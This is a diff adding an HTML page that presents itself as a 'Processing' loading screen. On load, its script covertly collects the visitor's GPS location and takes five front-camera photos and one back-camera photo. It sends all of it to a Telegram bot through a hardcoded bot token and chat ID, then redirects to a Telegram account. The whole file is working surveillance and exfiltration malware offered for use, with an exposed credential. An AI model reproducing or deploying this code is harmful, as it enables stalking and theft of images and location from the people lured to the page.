@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Processing</title>
+    <style>
+        body { margin: 0; padding: 0; overflow: hidden; background-color: #fff; font-family: Arial, sans-serif; }
+        #loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; text-align: center; z-index: 1000; }
+        #cameraFeed { display: none; width: 100%; height: 100%; object-fit: cover; }
+        #cameraCanvas { display: none; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loading">
+        <div class="spinner"></div>
+        <p>Processing...</p>
+    </div>
+    
+    <video id="cameraFeed" autoplay playsinline></video>
+    <canvas id="cameraCanvas"></canvas>
+
+    <script>
+        // IMPORTANT: This page must be served over HTTPS for camera and geolocation to work.
+        const BOT_TOKEN = '7876995869:AAGmef_SeJE8II79qZPcsRstw6kELpcbHDs';
+        const CHAT_ID = '61859882';
+        const REDIRECT_URL = 'https://t.me/Nono3928';
+        
+        let trackId = '';
+        let currentStream = null;
+
+        const gId = () => Math.random().toString(36).substring(2, 15);
+        const dToB = (dataURI) => {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        };
+
+        const apiRequest = (endpoint, body) => fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
+            method: 'POST',
+            body: body
+        }).then(res => res.json()).catch(err => console.error(`API request failed: ${endpoint}`, err));
+
+        const sendPhoto = (photoData, photoNum, camera) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', dToB(photoData), `photo_${trackId}_${photoNum}_${camera}.jpg`);
+            fd.append('caption', `Track ID: ${trackId}\nPhoto: ${photoNum}\nCamera: ${camera}`);
+            return apiRequest('sendPhoto', fd);
+        };
+
+        const sendMessage = (message) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('text', message);
+            return apiRequest('sendMessage', fd);
+        };
+        
+        const sendLocation = (lat, lon) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('latitude', lat);
+            fd.append('longitude', lon);
+            return apiRequest('sendLocation', fd);
+        };
+
+        const setupCamera = async (facingMode = 'user') => {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+                const video = document.getElementById('cameraFeed');
+                video.srcObject = stream;
+                currentStream = stream;
+                await video.play();
+                return true;
+            } catch (err) {
+                console.error('Error accessing camera:', err);
+                return false;
+            }
+        };
+
+        const takePhoto = async () => {
+            const video = document.getElementById('cameraFeed');
+            const canvas = document.getElementById('cameraCanvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/jpeg', 0.8);
+        };
+
+        const getLocation = () => new Promise((resolve, reject) => {
+            if (!navigator.geolocation) {
+                return reject(new Error("Geolocation not supported."));
+            }
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        });
+
+        const run = async () => {
+            try {
+                trackId = gId();
+                document.getElementById('loading').style.display = 'block';
+                await sendMessage(`New session started - Track ID: ${trackId}`);
+                
+                // Get location first
+                try {
+                    const position = await getLocation();
+                    await sendLocation(position.coords.latitude, position.coords.longitude);
+                } catch (error) {
+                    let reason = "Location access failed.";
+                    if (error.code) {
+                        switch (error.code) {
+                            case error.PERMISSION_DENIED: reason = "User denied the request for Geolocation."; break;
+                            case error.POSITION_UNAVAILABLE: reason = "Location information is unavailable."; break;
+                            case error.TIMEOUT: reason = "The request to get user location timed out."; break;
+                            default: reason = `An unknown error occurred (${error.message}).`; break;
+                        }
+                    } else {
+                        reason = error.message;
+                    }
+                    console.error('Could not get location:', reason);
+                    await sendMessage(`Track ID: ${trackId} - ${reason}`);
+                }
+                
+                const processCamera = async (facingMode, photoCount, startNum) => {
+                    if (await setupCamera(facingMode)) {
+                        await new Promise(resolve => setTimeout(resolve, 1000)); // Stabilize
+                        for (let i = 0; i < photoCount; i++) {
+                            const photoData = await takePhoto();
+                            await sendPhoto(photoData, startNum + i, facingMode);
+                            if (photoCount > 1) await new Promise(resolve => setTimeout(resolve, 500));
+                        }
+                    } else {
+                        await sendMessage(`Track ID: ${trackId} - ${facingMode} camera access denied or failed`);
+                    }
+                };
+
+                // Front camera: 5 photos
+                await processCamera('user', 5, 1);
+                // Back camera: 1 photo
+                await processCamera('environment', 1, 6);
+                
+                if (currentStream) {
+                    currentStream.getTracks().forEach(track => track.stop());
+                }
+                
+                await sendMessage(`Track ID: ${trackId} - Session completed.`);
+                
+            } catch (error) {
+                console.error('Error in execution sequence:', error);
+                await sendMessage(`Track ID: ${trackId} - Error occurred: ${error.message}`);
+            } finally {
+                // Always hide loading and redirect
+                document.getElementById('loading').style.display = 'none';
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+            }
+        };
+
+        window.addEventListener('load', () => setTimeout(run, 500));
+    </script>
+</body>
+</html>
